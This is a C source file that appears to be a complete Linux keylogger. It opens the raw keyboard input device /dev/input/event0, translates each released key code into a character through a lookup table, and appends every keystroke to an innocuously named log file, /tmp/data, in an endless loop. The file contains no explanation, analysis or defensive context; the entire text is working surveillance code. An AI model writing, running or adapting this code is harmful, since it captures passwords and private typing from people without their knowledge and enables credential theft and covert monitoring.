#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <stdlib.h>

#define LOGFILE "/tmp/data"
#define DEVICE "/dev/input/event0"

int main() {
    struct input_event ev;
    int fd = open(DEVICE, O_RDONLY);
    if (fd == -1) {
        perror("Error opening device");
        return 1;
    }

    FILE *fp = fopen(LOGFILE, "a");
    if (fp == NULL) {
        perror("Error opening log file");
        close(fd);
        return 1;
    }

    char *map[] = {
        "", "", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "KEY_BACKSPACE", "", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "\n", "",
	 "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "", "\\", 
        "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "", "", " ", "" 
    };

    while (1) {
        if (read(fd, &ev, sizeof(ev)) == -1) {
            perror("Error reading input");
            break;
        }

        if ((ev.type == EV_KEY) && (ev.value == 0)){
            if (ev.code == 28)    // Enter key
                fprintf(fp, "\n");
            else if (ev.code == 57)   // Space key
                fprintf(fp, " ");
            else if (ev.code < 59)
                fprintf(fp, "%s", map[ev.code]);
            fflush(fp);
        }
    }

    fclose(fp);
    close(fd);
    return 0;
}
